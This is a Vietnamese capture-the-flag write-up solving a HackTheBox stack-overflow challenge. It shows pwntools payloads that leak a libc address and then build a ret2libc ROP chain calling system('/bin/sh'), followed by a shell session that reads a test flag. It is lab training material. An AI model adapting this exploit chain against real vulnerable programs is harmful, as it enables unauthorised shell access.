# write up rocket_blaster
- trước tiên hàm main có buffer overflow

```C
  __int64 buf[4]; // [rsp+0h] [rbp-20h] BYREF

  banner(argc, argv, envp);
  memset(buf, 0, sizeof(buf));
  fflush(_bss_start);
  printf(
    "\n"
    "Prepare for trouble and make it double, or triple..\n"
    "\n"
    "You need to place the ammo in the right place to load the Rocket Blaster XXX!\n"
    "\n"
    ">> ");
  fflush(_bss_start);
  read(0, buf, 102uLL);
  puts("\nPreparing beta testing..");
```
- vì pie tắt nên em có thể sài gadget có sẵn để leak địa chỉ libc trước, vì ở binary thiếu gadget để chạy shell
```assembly
report/hacktheboxx/rocket_blaster
shell@~🍎 ROPgadget --binary rocket_blaster_xxx | grep "pop"
0x000000000040125b : add byte ptr [rcx], al ; pop rbp ; ret
0x0000000000401256 : mov byte ptr [rip + 0x3dcb], 1 ; pop rbp ; ret
0x00000000004012f2 : nop ; pop rbp ; ret
0x000000000040125d : pop rbp ; ret
0x000000000040159f : pop rdi ; ret
0x000000000040159b : pop rdx ; ret
0x00000000004013ae : pop rsi ; or al, 0 ; add byte ptr [rax - 0x77], cl ; ret 0x8d48
0x000000000040159d : pop rsi ; ret
```
- sau khi có đủ gadget thì nhập vào và leak được địa chỉ, rồi tiếp theo là quay lại hàm main để nhập thêm phát nữa
```python
pop_rdi = 0x000000000040159f
ret = 0x0000000000401588
puts = 0x4010e0
main_back = 0x00000000004014ff
payload = b''.ljust(0x28)
payload += p64(ret)
payload +=  p64(pop_rdi)
payload += p64(0x404fc0)
payload += p64(puts)
payload += p64(main_back)
p.sendlineafter(b'>>',payload)
p.recvuntil(b'beta testing..\n')
```
- lần này có đủ gadget rồi thì em nhập vào và run thì có shell để cat flag
```python
log.info(f'leak_addr: ' + hex(leak_addr))
libc_base = leak_addr - 0x1147d0
syscall = libc_base + 0x0000000000029db4
bin_sh = libc_base+ 0x1d8678
pop_rax = libc_base + 0x0000000000045eb0
system_libc = libc_base + 0x50d70
payload = b''.ljust(0x28)
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(system_libc)
p.sendlineafter(b'>>',payload)
```
- cat flag

```bash
Preparing beta testing..
$ ls
[DEBUG] Sent 0x3 bytes:
    b'ls\n'
[DEBUG] Received 0x131 bytes:
    b'flag.txt\t      rocket_blaster_xxx      rocket_blaster_xxx.nam\n'
    b'glibc\t\t      rocket_blaster_xxx.i64  rocket_blaster_xxx.py\n'
    b'ld-linux-x86-64.so.2  rocket_blaster_xxx.id0  rocket_blaster_xxx.til\n'
    b'libc.so.6\t      rocket_blaster_xxx.id1  rocket_blaster_xxx_patched\n'
    b'rock.md\t\t      rocket_blaster_xxx.id2  solve.py\n'
flag.txt          rocket_blaster_xxx      rocket_blaster_xxx.nam
glibc              rocket_blaster_xxx.i64  rocket_blaster_xxx.py
ld-linux-x86-64.so.2  rocket_blaster_xxx.id0  rocket_blaster_xxx.til
libc.so.6          rocket_blaster_xxx.id1  rocket_blaster_xxx_patched
rock.md              rocket_blaster_xxx.id2  solve.py
$ cat flag.txt
[DEBUG] Sent 0xd bytes:
    b'cat flag.txt\n'
[DEBUG] Received 0x19 bytes:
    b'HTB{f4k3_fl4g_4_t35t1ng}\n'
HTB{f4k3_fl4g_4_t35t1ng}
$
```
